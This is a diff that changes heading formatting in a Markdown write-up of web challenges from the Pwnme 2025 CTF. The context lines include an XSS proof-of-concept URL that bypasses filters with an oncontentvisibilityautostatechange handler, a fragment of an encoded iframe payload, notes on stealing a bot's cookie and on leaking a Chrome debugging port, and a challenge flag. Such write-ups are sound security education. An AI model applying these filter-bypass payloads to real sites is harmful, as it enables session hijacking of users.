@@ -6,7 +6,7 @@ draft: false
 summary: 'Writeup for the web challenges in the Pwnme 2025 CTF. There is a very interesting account take over challenge in a black-box setting.'
 ---
 
-## Hack the Bot - 1
+## **Hack the Bot - 1**
 
 ### **Vulnerability**
 
@@ -53,7 +53,7 @@ The following payload triggers an XSS by leveraging the `oncontentvisibilityaut
 https://hackthebot2-512f165761b6a6e8.deploy.phreaks.fr/?q=%3Cinput%20oncontentvisibilityautostatechange=confirm(1)%20style=content-visibility:auto%20type=hiddle%20%3E
 ```
 
-### **Exploit**
+### Exploit
 
 Constructing an exploit is challenging due to the imposed restrictions. The bot sets the cookie only after visiting the page, preventing direct fetching. We must wait and check periodically if the cookie is set. However, we cannot use `setInterval` or `setTimeout` (due to uppercase characters), nor can we use a busy-wait loop (`while`), as it would block `page.goto` from completing.
 
@@ -107,7 +107,7 @@ http://localhost/?q=<iframe srcdoc='&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62
 PWNME{D1d_y0U_S4iD-F1lt33Rs?}
 ```
 
-## Say My Name
+## **Say My Name**
 
 ### **Flawed XSS Sanitization**
 
@@ -216,7 +216,7 @@ This exploitation works when you control two parts of the HTML code: one to inje
 
 Here is the author’s solve: [https://github.com/Phreaks-2600/PwnMeCTF-2025-quals/blob/main/Web/sayMyName/solve/solver.py](https://github.com/Phreaks-2600/PwnMeCTF-2025-quals/blob/main/Web/sayMyName/solve/solver.py)
 
-## Hack the Bot - 2
+## **Hack the Bot - 2**
 
 I didn’t manage to solve this challenge during the game. I know it’s related to connecting to Chrome via the CDP remote debugging port. However, since the challenge doesn’t explicitly set the port using `--remote-debugging-port`, I wasn’t aware that I could leak it from the browser’s user data folder.
 
